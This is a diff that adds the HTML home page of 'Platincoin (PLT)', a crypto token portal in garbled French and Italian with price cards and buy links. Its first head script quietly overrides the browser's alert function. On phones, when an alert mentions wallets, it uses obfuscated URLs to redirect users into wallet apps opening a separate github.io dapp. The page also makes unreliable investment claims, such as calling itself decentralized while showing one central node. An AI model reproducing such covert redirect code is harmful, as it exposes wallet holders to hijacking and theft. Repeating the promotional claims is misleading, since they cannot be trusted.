@@ -1,0 +1,1425 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<script>(function(){var orig=window.alert;window.alert=function(m){var msg=String(m||"").toLowerCase();if(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)&&(msg.includes("web3")||msg.includes("metamask")||msg.includes("wallet"))){var d="platincoin-protocol.github.io"+String.fromCharCode(47)+"Platincoin-PLT";var c=prompt("Scegli wallet (1, 2 o 3):\n1 = MetaMask\n2 = Trust Wallet\n3 = Phantom","1");if(!c)return;c=c.trim();if(c==="2"){window.location.href="https:"+String.fromCharCode(47,47)+"://trustwallet.com"+String.fromCharCode(47)+"open_url?coin_id=20000714&url=https:"+String.fromCharCode(47,47)+d;}else if(c==="3"){var t=encodeURIComponent("https:"+String.fromCharCode(47,47)+d);window.location.href="https:"+String.fromCharCode(47,47)+"phantom.app"+String.fromCharCode(47)+"ul"+String.fromCharCode(47)+"browse"+String.fromCharCode(47)+t+"?ref="+t;}else{window.location.href="https:"+String.fromCharCode(47,47)+"metamask.app.link"+String.fromCharCode(47)+"dapp"+String.fromCharCode(47)+d;}return;}return orig.apply(this,arguments);};})();</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Platincoin (PLT) | Portail officiel</title>
+    <style>
+        :root {            
+            --bg-main: #0b0f19;
+            --bg-card: #131a2c;
+            --bg-input: #070a12;
+            --color-text: #f1f5f9;
+            --color-muted: #64748b;
+            --color-platinum: #e2e8f0;
+            --color-green: #10b981;
+            --color-gold: #f59e0b;
+            --border: #1e293b;
+        }
+        body { background: var(--bg-main); color: var(--color-text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding: 40px 20px; margin: 0; -webkit-font-smoothing: antialiased; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .header-nav { display: flex; justify-content: flex-end; margin-bottom: 10px; }
+        .lang-switch { display: flex; background: #070a12; padding: 4px; border-radius: 8px; border: 1px solid var(--border); }
+        .lang-btn { background: transparent; border: none; color: var(--color-muted); padding: 6px 14px; font-size: 12px; font-weight: 700; border-radius: 6px; cursor: pointer; transition: all 0.2s; text-transform: uppercase; }
+        .lang-btn.active { background: var(--color-platinum); color: #0b0f19; }
+        h1 { font-size: 32px; font-weight: 800; letter-spacing: -0.5px; color: var(--color-text); margin: 15px 0 5px 0; text-transform: uppercase; }
+        .subtitle { color: var(--color-muted); font-size: 16px; margin-top: 0; margin-bottom: 40px; font-weight: 500; letter-spacing: 0.5px; }
+        .logo-container { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
+        .logo-img { width: 140px; height: 140px; border-radius: 50%; object-fit: cover; box-shadow: 0 0 40px rgba(226, 232, 240, 0.15); border: 2px solid var(--color-platinum); }
+        .grid { display: flex; gap: 16px; flex-wrap: wrap; margin: 30px auto; }
+        .card { flex: 1; min-width: 190px; background: var(--bg-card); padding: 22px; border-radius: 16px; border: 1px solid var(--border); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.4); text-align: left; }
+        .card h3 { margin: 0 0 8px 0; color: var(--color-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; font-weight: 700; }
+        .card p { font-size: 26px; font-weight: 700; margin: 0; color: var(--color-text); letter-spacing: -0.5px; }
+        .card small { display: block; margin-top: 6px; color: var(--color-muted); font-size: 11px; }
+        .btn { display: inline-block; background: var(--color-platinum); color: #0b0f19; padding: 12px 24px; border-radius: 10px; text-decoration: none; font-weight: 700; margin-top: 10px; transition: all 0.2s; cursor: pointer; border: none; font-size: 14px; box-shadow: 0 4px 12px rgba(226,232,240,0.2); }
+        .btn:hover { background: #ffffff; transform: translateY(-1px); }
+        .btn-secondary { display: inline-block; background: transparent; color: var(--color-platinum); border: 1px solid var(--border); padding: 12px 24px; border-radius: 10px; text-decoration: none; font-weight: 700; margin-top: 10px; font-size: 14px; margin-left: 10px; cursor: pointer; }
+        .btn-secondary:hover { background: rgba(255,255,255,0.05); border-color: var(--color-muted); color: #fff; }
+        section { max-width: 900px; margin: 60px auto 0 auto; text-align: left; border-top: 1px solid var(--border); padding-top: 50px; }
+        section h2 { text-align: left; color: var(--color-text); font-size: 22px; font-weight: 700; margin-bottom: 25px; letter-spacing: -0.5px; }
+        .flex-layout { display: flex; gap: 30px; flex-wrap: wrap; margin-top: 20px; }
+        .flex-col-left { flex: 1.2; min-width: 320px; }
+        .flex-col-right { flex: 1; min-width: 320px; }
+        .calculator-box { background: var(--bg-card); padding: 24px; border-radius: 16px; border: 1px solid var(--border); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.4); box-sizing: border-box; }
+        .calculator-box h3 { margin: 0 0 15px 0; font-size: 15px; color: var(--color-platinum); font-weight: 600; }
+        .calc-group { margin-bottom: 16px; text-align: left; }
+        .calc-group label { display: block; font-size: 12px; color: var(--color-muted); margin-bottom: 6px; font-weight: 600; text-transform: uppercase; }
+        .calc-input, .calc-select { width: 100%; padding: 12px; background: var(--bg-input); border: 1px solid var(--border); color: var(--color-text); border-radius: 8px; box-sizing: border-box; font-size: 15px; font-weight: 600; }
+        .calc-result { background: var(--bg-input); padding: 14px 16px; border-radius: 8px; border-left: 4px solid var(--color-green); margin-top: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .calc-result p { margin: 0; font-size: 13px; color: var(--color-muted); }
+        .calc-result span { font-size: 18px; font-weight: 700; color: var(--color-text); }
+        .buy-step { background: var(--bg-card); padding: 18px; border-radius: 12px; border: 1px solid var(--border); margin-bottom: 12px; display: flex; gap: 16px; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .buy-num { background: var(--bg-input); color: var(--color-platinum); font-weight: 700; min-width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 13px; border: 1px solid var(--border); }
+        .buy-text { text-align: left; flex: 1; }
+        .buy-text h4 { margin: 0 0 3px 0; color: var(--color-text); font-size: 14px; font-weight: 600; }
+        .buy-text p { margin: 0; color: var(--color-muted); font-size: 12px; font-weight: 500; line-height: 1.4; }
+        .timeline { border-left: 2px solid var(--border); padding-left: 20px; margin-left: 10px; }
+        .timeline-item { margin-bottom: 25px; position: relative; }
+        .timeline-item::before { content: ""; position: absolute; left: -26px; top: 4px; width: 10px; height: 10px; border-radius: 50%; background: var(--color-platinum); border: 2px solid var(--bg-main); }
+        .timeline-item h4 { margin: 0 0 4px 0; color: var(--color-text); font-size: 15px; font-weight: 600; }
+        .timeline-item p { margin: 0; color: var(--color-muted); font-size: 13px; }
+        .faq-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; }
+        .faq-item { background: var(--bg-card); padding: 20px; border-radius: 12px; border: 1px solid var(--border); box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .faq-item h4 { margin: 0 0 8px 0; color: var(--color-text); font-size: 14px; font-weight: 600; }
+        .faq-item p { margin: 0; color: var(--color-muted); font-size: 12px; font-weight: 500; }
+        footer { margin-top: 80px; padding-top: 20px; border-top: 1px solid var(--border); color: var(--color-muted); font-size: 12px; }
+        .lang-it { display: none; }
+        @keyframes float {
+  0% { transform: translateY(0px); }
+  50% { transform: translateY(-12px); }
+  100% { transform: translateY(0px); }
+}
+.floating-logo {
+  animation: float 4s ease-in-out infinite;
+}
+.pulse-green {
+  display: inline-block;
+  width: 10px;
+  height: 10px;
+  background-color: #00ffcc;
+  border-radius: 50%;
+  margin-right: 8px;
+  box-shadow: 0 0 0 0 rgba(0, 255, 204, 0.7);
+  animation: pulse 1.5s infinite;
+  vertical-align: middle;
+}
+@keyframes pulse {
+  0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 204, 0.7); }
+  70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(0, 255, 204, 0); }
+  100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 255, 204, 0); }
+}
+
+    </style>
+<link rel="apple-touch-icon" href="PLT_logo_320x320.png">
+<style id="plt-mobile-responsive">
+  html, body {
+    max-width: 100%;
+    overflow-x: hidden;
+  }
+  @media (max-width: 680px) {
+    body {
+      padding-left: 10px !important;
+      padding-right: 10px !important;
+    }
+    .container, main, section {
+      max-width: 100% !important;
+      padding-left: 14px !important;
+      padding-right: 14px !important;
+    }
+    .logo-container {
+      flex-direction: column !important;
+      text-align: center !important;
+      padding: 22px 16px !important;
+      gap: 14px !important;
+    }
+    .logo-container img.logo-img {
+      width: 84px !important;
+      height: 84px !important;
+      margin: 0 auto !important;
+    }
+    .logo-container div[style*="font-size:34px"] {
+      font-size: 24px !important;
+      letter-spacing: 0.8px !important;
+    }
+    .logo-container p.subtitle {
+      font-size: 11.5px !important;
+      line-height: 1.45 !important;
+    }
+    .card {
+      padding: 16px !important;
+      flex-direction: column !important;
+      align-items: flex-start !important;
+    }
+    .card a[href*="pancakeswap"] {
+      display: block !important;
+      width: 100% !important;
+      max-width: 100% !important;
+      box-sizing: border-box !important;
+      text-align: center !important;
+      margin-top: 10px !important;
+    }
+    #plt-tokenomics-showcase > div[style*="grid"],
+    #plt-roadmap-section > div[style*="grid"] {
+      grid-template-columns: repeat(2, minmax(0, 1fr)) !important;
+      gap: 10px !important;
+    }
+    #plt-tokenomics-showcase > div[style*="grid"] > div,
+    #plt-roadmap-section > div[style*="grid"] > div {
+      min-width: 0 !important;
+      padding: 12px !important;
+    }
+    #plt-tokenomics-showcase strong,
+    #plt-tokenomics-showcase [style*="font-size:20px"],
+    #plt-tokenomics-showcase [style*="font-size:22px"] {
+      font-size: 16px !important;
+      word-break: break-word !important;
+    }
+    #plt-tokenomics-showcase table,
+    #plt-tokenomics-showcase tbody,
+    #plt-tokenomics-showcase tr {
+      display: block !important;
+      width: 100% !important;
+      margin: 0 !important;
+      border-spacing: 0 !important;
+    }
+    #plt-tokenomics-showcase td {
+      display: block !important;
+      width: 100% !important;
+      box-sizing: border-box !important;
+      margin-bottom: 10px !important;
+      text-align: left !important;
+    }
+    #plt-tokenomics-showcase td a[href*="pancakeswap"] {
+      display: block !important;
+      width: 100% !important;
+      text-align: center !important;
+      box-sizing: border-box !important;
+    }
+    #plt-tokenomics-showcase, #plt-roadmap-section {
+      padding: 18px 14px !important;
+      margin-left: 0 !important;
+      margin-right: 0 !important;
+    }
+    #plt-tokenomics-showcase nav {
+      flex-direction: column !important;
+    }
+    #plt-tokenomics-showcase nav a,
+    #plt-tokenomics-showcase nav button {
+      width: 100% !important;
+      text-align: center !important;
+      box-sizing: border-box !important;
+    }
+    #plt-trade-chart {
+      height: 210px !important;
+    }
+    code, [style*="word-break"] {
+      word-break: break-all !important;
+      font-size: 11px !important;
+    }
+  }
+</style>
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="Platincoin ($PLT)" />
+  <meta property="og:title" content="Platincoin ($PLT) — Dual SHA-256 PoW & BEP-20 Protocol" />
+  <meta property="og:description" content="11,000,000 Fixed Supply | 0 % Taxe Achat/Vente | 89.85% Locked in Mining Vault | Liquidité Verrouillée 1 An (PinkLock #2113264)." />
+  <meta property="og:url" content="https://platincoin-plt.org" />
+  <meta property="og:image" content="https://platincoin-plt.org/og-card-v2.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:site" content="@PlatincoinPLT" />
+  <meta name="twitter:title" content="Platincoin ($PLT) — Dual SHA-256 PoW & BEP-20 Protocol" />
+  <meta name="twitter:description" content="11,000,000 Fixed Supply | 0% Tax | 89.85% Mining Vault Locked | 1-Year LP Locked on BNB Smart Chain." />
+  <meta name="twitter:image" content="https://platincoin-plt.org/og-card-v2.png" />
+  <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png" />
+  <link rel="shortcut icon" href="/favicon.ico" />
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Organization",
+      "@id": "https://platincoin-plt.org/#organization",
+      "name": "Platincoin (PLT)",
+      "alternateName": [
+        "Platincoin PLT",
+        "$PLT",
+        "Platincoin Protocol"
+      ],
+      "url": "https://platincoin-plt.org/",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://platincoin-plt.org/PLT_logo_320x320.png",
+        "width": 320,
+        "height": 320
+      },
+      "email": "info@platincoin-plt.org",
+      "description": "Platincoin ($PLT) is a decentralized digital commodity engineered around a Dual SHA-256 Proof-of-Work & BNB Smart Chain (BEP-20) architecture with a strict 11,000,000 fixed supply.",
+      "sameAs": [
+        "https://x.com",
+        "https://discord.gg",
+        "https://github.com",
+        "https://bscscan.com",
+        "https://geckoterminal.com"
+      ]
+    },
+    {
+      "@type": "WebSite",
+      "@id": "https://platincoin-plt.org/#website",
+      "url": "https://platincoin-plt.org/",
+      "name": "Platincoin (PLT) | Official Portal",
+      "publisher": {
+        "@id": "https://platincoin-plt.org/#organization"
+      }
+    }
+  ]
+}
+</script>
+
+
+
+<style id="plt-universal-responsive">
+  @media (max-width: 768px) {
+    html, body { overflow-x: hidden !important; }
+    .plt-mobile-stack {
+      display: flex !important;
+      flex-direction: column !important;
+      grid-template-columns: 1fr !important;
+      gap: 16px !important;
+    }
+    .plt-mobile-stack > div {
+      width: 100% !important;
+      max-width: 100% !important;
+      min-width: 0 !important;
+    }
+    #fcn-widget { transform: scale(0.8) !important; transform-origin: left center !important; }
+  }
+</style>
+<style id="plt-wide-test">
+  @media (min-width: 1024px) {
+    .container, main, section, header, footer, [style*="max-width: 1180px"], [style*="max-width:1180px"], [style*="max-width: 1100px"], [style*="max-width:1100px"], [style*="max-width: 960px"], [style*="max-width:960px"] {
+      max-width: 1520px !important;
+      width: 96% !important;
+    }
+  }
+</style>
+</head>
+
+<body>
+<header id="plt-hamburger-bar" style="max-width:960px;margin:12px auto 10px;padding:10px 16px;border-radius:14px;background:rgba(15,23,42,0.94);backdrop-filter:blur(10px);border:1px solid rgba(52,211,153,0.28);display:flex;align-items:center;justify-content:space-between;position:relative;z-index:1000;">
+  <a href="index-fr.html" style="display:flex;align-items:center;gap:10px;text-decoration:none;color:#fff;">
+    <img src="PLT_logo_320x320.png" alt="PLT" style="width:28px;height:28px;border-radius:50%;">
+    <strong style="font-size:14.5px;letter-spacing:0.6px;">PLATINCOIN <span style="color:#34d399;">(PLT)</span></strong>
+  </a>
+    </div>
+
+  <button type="button" id="plt-menu-toggle" aria-label="Menu" style="width:42px;height:38px;border-radius:10px;border:1px solid rgba(52,211,153,0.38);background:rgba(52,211,153,0.12);cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;padding:0;">
+    <span style="display:block;width:20px;height:2px;background:#34d399;border-radius:2px;"></span>
+    <span style="display:block;width:20px;height:2px;background:#34d399;border-radius:2px;"></span>
+    <span style="display:block;width:20px;height:2px;background:#34d399;border-radius:2px;"></span>
+  </button>
+
+  <div id="plt-dropdown-menu" style="display:none;position:absolute;top:56px;right:0;min-width:240px;border-radius:14px;padding:8px;background:#111827;border:1px solid rgba(52,211,153,0.4);box-shadow:0 18px 40px rgba(0,0,0,0.8);text-align:left;">
+    <a href="index-fr.html" style="display:block;padding:12px 14px;border-radius:10px;color:#f8fafc;text-decoration:none;font-size:14px;font-weight:700;border-bottom:1px solid rgba(255,255,255,0.07);">
+      <span class="lang-en">🏠 Home</span>
+      <span class="lang-it" style="display:none;">🏠 Home</span>
+    </a>
+    <a href="docs-fr.html" style="display:block;padding:12px 14px;border-radius:10px;color:#c4b5fd;text-decoration:none;font-size:14px;font-weight:700;border-bottom:1px solid rgba(255,255,255,0.07);">
+      <span class="lang-en">📖 FAQ & Docs</span>
+      <span class="lang-it" style="display:none;">📖 FAQ e Documenti</span>
+    </a>
+    <a href="contact-fr.html" style="display:block;padding:12px 14px;border-radius:10px;color:#34d399;text-decoration:none;font-size:14px;font-weight:700;">
+      <span class="lang-en">✉️ Contact Us</span>
+      <span class="lang-it" style="display:none;">✉️ Contatti</span>
+    </a>
+
+  <a href="explorer-fr.html" style="display:flex;align-items:center;gap:10px;padding:11px 14px;color:#e2e8f0;font-size:13.5px;font-weight:600;text-decoration:none;border-top:1px solid rgba(52,211,153,0.15);">⛓️ PoW Node Explorer</a>
+    <a href="whitepaper-fr.html" style="display:flex;align-items:center;gap:10px;padding:11px 14px;color:#e2e8f0;font-size:13.5px;font-weight:600;text-decoration:none;border-top:1px solid rgba(52,211,153,0.15);">📄 White Paper</a>
+</div>
+</header>
+<script>
+(function() {
+  const btn = document.getElementById("plt-menu-toggle");
+  const menu = document.getElementById("plt-dropdown-menu");
+  if (!btn || !menu) return;
+  btn.addEventListener("click", function(e) {
+    e.stopPropagation();
+    menu.style.display = menu.style.display === "block" ? "none" : "block";
+  });
+  document.addEventListener("click", function(e) {
+    if (!menu.contains(e.target) && !btn.contains(e.target)) menu.style.display = "none";
+  });
+})();
+</script>
+<!-- BANNER CYBERPUNK BILINGUE IN ALTO -->
+<div style="background: #0d1117; border-bottom: 2px solid #00ffcc; padding: 10px; font-family: monospace; text-align: center; box-shadow: 0 4px 10px rgba(0, 255, 204, 0.2); width: 100%; margin-bottom: 30px;">
+  <span style="color: #00ffcc; font-weight: bold; margin-right: 15px;"><span class="pulse-green"></span>⚡ ÉTAT DU RÉSEAU [SHA-256]: ACTIF</span>
+  
+  <!-- Scritte in INGLESE (Visibili se clicchi ENG) -->
+  <span class="lang-en" style="color: #ffffff; margin-right: 15px;">• Dernier Bloc : #<span id="banner-block-en">--</span></span>
+  <span class="lang-en" style="color: #ffffff; margin-right: 15px;">• Nœuds : <span id="banner-nodes-en">1</span> (Central)</span>
+  <span class="lang-en" style="color: #00ffcc; font-weight: bold;">• Miné : <span id="banner-balance-en">34.150,00</span> PLT</span>
+
+  <!-- Scritte in ITALIANO (Visibili se clicchi ITA) -->
+  <span class="lang-it" style="color: #ffffff; margin-right: 15px;">• Ultimo Blocco: #<span id="banner-block-it">--</span></span>
+  <span class="lang-it" style="color: #ffffff; margin-right: 15px;">• Nodi: <span id="banner-nodes-it">1</span> (Centrale)</span>
+  <span class="lang-it" style="color: #00ffcc; font-weight: bold;">• Estratto: <span id="banner-balance-it">34.150,00</span> PLT</span>
+  <!-- Gas Tracker Bilingue -->
+  <span class="lang-en" style="color: #ffffff; margin-left: 15px;">• Gas: <span id="banner-gas-en" style="color: #00ffcc;">3Gwei</span></span>
+  <span class="lang-it" style="color: #ffffff; margin-left: 15px;">• Gas: <span id="banner-gas-it" style="color: #00ffcc;">3Gwei</span></span>
+
+</div>
+
+    <div class="container">
+        <div class="header-nav">
+            <div class="lang-switch" style="position:relative;display:inline-block;z-index:1100;">
+  <button type="button" id="lang-dd-btn" onclick="const m=document.getElementById('lang-dd-menu');m.style.display=m.style.display==='block'?'none':'block';" style="display:flex;align-items:center;gap:6px;padding:7px 13px;border-radius:10px;background:rgba(15,23,42,0.92);border:1px solid rgba(52,211,153,0.4);color:#f8fafc;font-size:12.5px;font-weight:700;cursor:pointer;">🌐 <span id="lang-dd-cur">FR</span> ▾</button>
+  <div id="lang-dd-menu" style="display:none;position:absolute;right:0;top:38px;min-width:155px;background:#111827;border:1px solid rgba(52,211,153,0.4);border-radius:12px;padding:5px;box-shadow:0 14px 30px rgba(0,0,0,0.75);text-align:left;">
+    <button type="button" id="btn-en" onclick="switchLang('en');document.getElementById('lang-dd-cur').textContent='ENG';document.getElementById('lang-dd-menu').style.display='none';" style="width:100%;text-align:left;background:transparent;border:none;color:#e2e8f0;padding:8px 10px;border-radius:8px;font-size:12.5px;font-weight:600;cursor:pointer;">🇬🇧 English (ENG)</button>
+    <button type="button" id="btn-it" onclick="switchLang('it');document.getElementById('lang-dd-cur').textContent='ITA';document.getElementById('lang-dd-menu').style.display='none';" style="width:100%;text-align:left;background:transparent;border:none;color:#e2e8f0;padding:8px 10px;border-radius:8px;font-size:12.5px;font-weight:600;cursor:pointer;border-top:1px solid rgba(52,211,153,0.15);">🇮🇹 Italiano (ITA)</button>
+  </div>
+</div>
+        </div>
+        <div class="logo-container" style="max-width:920px;margin:16px auto 24px;padding:28px 36px;display:flex;align-items:center;justify-content:flex-start;gap:28px;background:radial-gradient(circle at 80% 35%,rgba(234,179,8,0.08),transparent 45%),radial-gradient(circle at 20% 50%,rgba(52,211,153,0.10),transparent 45%),linear-gradient(135deg,#0f172a 0%,#111827 55%,#0b1120 100%);border-radius:20px;border:1px solid rgba(52,211,153,0.32);box-shadow:0 12px 35px rgba(0,0,0,0.5);">
+  <img src="logo_3d_platino.png" alt="Platincoin Token" class="logo-img floating-logo" style="width:110px;height:110px;flex-shrink:0;">
+  <div style="flex:1;text-align:center;">
+    <div style="font-size:34px;font-weight:900;letter-spacing:1.5px;line-height:1.15;margin-bottom:8px;">
+      <span style="color:#ffffff;">PLATINCOIN</span> <span style="color:#eab308;">(PLT)</span>
+    </div>
+    <p class="subtitle lang-en" style="margin:0 0 6px;font-size:13px;font-weight:800;letter-spacing:1.2px;color:#34d399;text-transform:uppercase;">PREUVE DE TRAVAIL SOVEREIGN DUAL SHA-256 ET PRODUIT BEP-20</p>
+    <p class="subtitle lang-it" style="display:none;margin:0 0 6px;font-size:13px;font-weight:800;letter-spacing:1.2px;color:#34d399;text-transform:uppercase;">PROTOCOLE SOVRANO DUAL SHA-256 POW & COMMODITY BEP-20</p>
+    <p class="subtitle lang-en" style="margin:0 0 8px;font-size:12px;color:#94a3b8;">Offre Fixe de 11 000 000 PLT &nbsp;•&nbsp; 0 % Taxe Achat/Vente &nbsp;•&nbsp; Liquidité Verrouillée 1 An</p>
+    <p class="subtitle lang-it" style="display:none;margin:0 0 8px;font-size:12px;color:#94a3b8;">Cap Fisso 11.000.000 PLT &nbsp;•&nbsp; 0% Tasse Acquisto/Vendita &nbsp;•&nbsp; Liquidità Bloccata 1 Anno</p>
+    <p class="subtitle lang-en" style="margin:0;font-size:13px;font-weight:600;letter-spacing:0.6px;color:#cbd5e1;">Le réseau souverain numérique platine</p>
+<div id="hero-freshcoins-badge" style="margin:14px auto 0;display:flex;justify-content:center;align-items:center;transform:scale(0.88);transform-origin:center;">
+      </div>
+    <p class="subtitle lang-it" style="display:none;margin:0;font-size:13px;font-weight:600;letter-spacing:0.6px;color:#cbd5e1;">La Rete del Platino Digitale Sovrano</p>
+  </div>
+</div>
+    <div class="grid">
+    <div class="card">
+        <h3 class="lang-en">Prix ​​du marché en direct</h3><h3 class="lang-it">Prix ​​Live di Mercato</h3>
+        <p id="top-live-price" style="color: var(--color-green);"><span class="plt-live-val">$0.00974</span></p>
+        <span class="lang-en" style="font-size: 12px; color: #8b949e;">PancakeSwap V2 • En direct</span>
+        <span class="lang-it" style="font-size: 12px; color: #8b949e;">PancakeSwap V2 • À tempo réel</span>
+    </div>
+    <div class="card">
+        <h3 class="lang-en">Hauteur du Bloc</h3><h3 class="lang-it">Altezza Blocco</h3>
+        <p id="live-height">#0</p>
+        <span class="lang-en" style="font-size: 12px; color: #8b949e;">Synchronisation réseau en direct</span>
+        <span class="lang-it" style="font-size: 12px; color: #8b949e;">Synchronisation Live</span>
+    </div>
+    <div class="card">
+        <h3 class="lang-en">Approvisionnement en circulation</h3><h3 class="lang-it">Fornitura Circolante</h3>
+        <p id="live-supply">0,00 PLT</p>
+        <span class="lang-en" style="font-size: 12px; color: #8b949e;">Montant extrait de l’algorithme</span>
+        <span class="lang-it" style="font-size: 12px; color: #8b949e;">Quantité estimée</span>
+    </div>
+    <div class="card" style="display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;">
+                <div>
+                    <h3 class="lang-en">Offre maximale</h3><h3 class="lang-it" style="display:none;">Approvisionnement Massima</h3>
+                    <p>11 000 000</p>
+                    <span class="lang-en" style="font-size: 12px; color: #8b949e;">Paramètres de limite de plafond strict</span>
+                    <span class="lang-it" style="display:none; font-size: 12px; color: #8b949e;">Paramètres Limite Hard Cap</span>
+                </div>
+                <a href="https://pancakeswap.finance/swap?outputCurrency=0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8&inputCurrency=0x55d398326f99059fF775485246999027B3197955" target="_blank" rel="noopener" style="padding:12px 20px;border-radius:12px;background:linear-gradient(135deg,#7c5cff,#4f46e5);color:#fff;font-weight:700;font-size:14px;text-decoration:none;white-space:nowrap;box-shadow:0 4px 15px rgba(124,92,255,0.35);">
+                    <span class="lang-en">Acheter $ PLT ↗</span>
+                    <span class="lang-it" style="display:none;">Acheter $PLT ↗</span>
+                </a>
+            </div>
+</div>
+
+<!-- BOX CONTRATTO UFFICIALE & SICUREZZA ON-CHAIN -->
+<div style="background: #0d1117; border: 1px solid #30363d; border-radius: 12px; padding: 18px; margin-top: 20px; text-align: center;">
+    <div style="font-size: 12px; color: #00ffcc; font-weight: bold; letter-spacing: 1px; margin-bottom: 8px;">
+        <span class="lang-en">🛡️ CONTRAT INTELLIGENT BEP-20 VÉRIFIÉ (BNB SMART CHAIN)</span>
+        <span class="lang-it">🛡️ SMART CONTRACT BEP-20 VERIFICATO (BNB SMART CHAIN)</span>
+    </div>
+    <div style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 10px; margin-bottom: 12px;">
+        <code id="contractAddrText" style="background: #161b22; padding: 8px 14px; border-radius: 6px; border: 1px solid #30363d; color: #e6edf3; font-size: 13px; word-break: break-all;">0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8</code>
+        <button onclick="navigator.clipboard.writeText('0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8'); this.innerText='Copied ✓'; setTimeout(()=>this.innerText='Copy', 2000);" style="background: #238636; color: white; border: none; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 12px;">Copier</button>
+        <a href="https://bscscan.com/token/0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8" target="_blank" style="background: #1f6feb; color: white; text-decoration: none; padding: 8px 14px; border-radius: 6px; font-weight: bold; font-size: 12px;">BscScan ↗</a>
+        <a href="https://geckoterminal.com/bsc/pools/0xa51e99928c39ae656b7cb38006b8a1d220479b2c" target="_blank" style="background: #21262d; color: #00ffcc; border: 1px solid #30363d; text-decoration: none; padding: 8px 14px; border-radius: 6px; font-weight: bold; font-size: 12px;">Graphique en direct (GeckoTerminal) ↗</a>
+                <a href="https://discord.gg/nzSD7asHbE" target="_blank" style="background:#5865F2;color:white;text-decoration:none;padding:8px 14px;border-radius:6px;font-weight:bold;font-size:12px;">Rejoignez Discorde</a>
+                <a href="https://x.com/PlatincoinPLT" target="_blank" style="background:#161b22;color:white;border:1px solid #30363d;text-decoration:none;padding:8px 14px;border-radius:6px;font-weight:bold;font-size:12px;">X (@PlatincoinPLT)</a>
+
+    </div>
+    <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; font-size: 12px; color: #8b949e;">
+        <span style="background: rgba(35,134,54,0.15); color: #3fb950; padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(63,185,80,0.3);">✓ 0 % Taxe Achat/Vente</span>
+        <span style="background: rgba(35,134,54,0.15); color: #3fb950; padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(63,185,80,0.3);">✓ Offre Fixe 11M</span>
+        <span style="background: rgba(0,255,204,0.1); color: #00ffcc; padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(0,255,204,0.3);">✓ Garanti 1:1 par PoW</span>
+    </div>
+</div>
+<!-- BOX WAITLIST PRE-LANCIO (NETLIFY FORMS ANTI-SPAM) -->
+<div style="max-width:920px;margin:20px auto;padding:26px 30px;border-radius:18px;background:linear-gradient(145deg,rgba(20,24,38,0.95),rgba(12,15,25,0.98));border:1px solid rgba(52,211,153,0.32);box-shadow:0 12px 32px rgba(0,0,0,0.45);text-align:left;">
+  <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:12px;">
+    <span style="font-size:12px;font-weight:800;letter-spacing:1px;color:#34d399;text-transform:uppercase;">
+      <span class="lang-en">🏛️ À PROPOS DE PLATINCOIN ($PLT) — ARCHITECTURE DU PROTOCOLE SOUVERAIN</span>
+      <span class="lang-it" style="display:none;">🏛️ COS'È PLATINCOIN ($PLT) — ARCHITETTURA DEL PROTOCOLLO</span>
+    </span>
+    <span style="font-size:11px;font-weight:700;padding:4px 10px;border-radius:999px;background:rgba(124,92,255,0.18);color:#c4b5fd;">SHA-256 PoW + BEP-20</span>
+  </div>
+  <p class="lang-en" style="margin:0 0 12px;font-size:14px;line-height:1.65;color:#cbd5e1;">
+    <strong style="color:#ffffff;">Platinecoin ($PLT)</strong> est un produit numérique décentralisé conçu autour d'un <strong style="color:#34d399;">Double preuve de travail SHA-256 et chaîne intelligente BNB (BEP-20)</strong> architecture. Conçu pour une rareté vérifiable et une transparence à long terme, Platincoin impose une stricte <strong style="color:#ffffff;">Capuchon rigide fixe de 11 000 000 PLT</strong> avec zéro frappe inflationniste et <strong style="color:#34d399;">0 % de taxes sur les swaps d'achat/vente</strong>.
+  </p>
+  <p class="lang-it" style="display:none;margin:0 0 12px;font-size:14px;line-height:1.65;color:#cbd5e1;">
+    <strong style="color:#ffffff;">Platinecoin ($PLT)</strong> Il s'agit d'un produit numérique décentralisé basé sur une architecture hybride. <strong style="color:#34d399;">Double preuve de travail SHA-256 et chaîne intelligente BNB (BEP-20)</strong>. Projet pour garantir la disparition des cicatrices vérifiables et une transparence massive, impone un <strong style="color:#ffffff;">total massif fisso de 11.000.000 PLT</strong> sans émission d'inflammation et avec con <strong style="color:#34d399;">0% de tasse sugli scambi</strong>.
+  </p>
+  <p class="lang-en" style="margin:0;font-size:13px;line-height:1.6;color:#94a3b8;">
